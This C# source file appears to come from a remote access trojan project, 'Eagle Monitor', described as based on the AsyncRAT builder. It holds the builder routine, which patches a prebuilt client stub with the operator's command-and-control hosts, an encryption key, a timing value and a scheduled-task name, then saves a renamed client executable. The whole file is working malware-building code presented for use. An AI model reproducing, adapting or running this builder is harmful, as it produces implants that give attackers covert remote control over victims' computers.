using dnlib.DotNet;
using dnlib.DotNet.Emit;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
|| Based on AsyncRat Builder||
*/

namespace Eagle_Monitor.Helpers
{
    class BuilderHelper
    {
        public static BuilderSetting builderSetting;

        public class BuilderSetting 
        {
            public List<string> hostBuilder { get; set; }
            public List<int> hostPortBuilder { get; set; }
        }

        public void Build(bool bits64, string HostsList, string taskName, string time)
        {
            ModuleDefMD asmDef;
            if (bits64)
            {
                asmDef = ModuleDefMD.Load(Utilities.GPath + "\\Stubs\\Client64.exe");
            }
            else
            {
                asmDef = ModuleDefMD.Load(Utilities.GPath + "\\Stubs\\Client.exe");
            }
            try
            {
                using (asmDef)
                {
                    using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                    {
                        saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                        saveFileDialog1.InitialDirectory = Utilities.GPath;
                        saveFileDialog1.OverwritePrompt = false;
                        saveFileDialog1.FileName = "Client";
                        if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                        {
                            WriteSettings(asmDef, saveFileDialog1.FileName, HostsList, taskName, time);
                            asmDef.Write(saveFileDialog1.FileName);
                            asmDef.Dispose();
                            MessageBox.Show("Done !", "", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                    }
                }
            }
            catch (Exception)
            {
                asmDef?.Dispose();
            }
        }
        private void WriteSettings(ModuleDefMD asmDef, string AsmName, string HostsList, string taskName, string time)
        {
            foreach (TypeDef type in asmDef.Types)
            {
                asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                asmDef.Name = Path.GetFileName(AsmName);
                if (type.Name == "Utils")
                    foreach (MethodDef method in type.Methods)
                    {
                        if (method.Body == null) continue;
                        for (int i = 0; i < method.Body.Instructions.Count(); i++)
                        {
                            if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                            {
                                if (method.Body.Instructions[i].Operand.ToString() == "%HOSTS%")
                                {
                                    method.Body.Instructions[i].Operand = HostsList;
                                }
                                if (method.Body.Instructions[i].Operand.ToString() == "ThisIsMyKey")
                                {
                                    method.Body.Instructions[i].Operand = Utilities.RSMKey;
                                }

                                if (method.Body.Instructions[i].Operand.ToString() == "%1%")
                                {
                                    method.Body.Instructions[i].Operand = time;
                                }
                                if (method.Body.Instructions[i].Operand.ToString() == "%C%")
                                {
                                    method.Body.Instructions[i].Operand = taskName;
                                }
                            }
                        }
                    }
            }
        }
    }
}
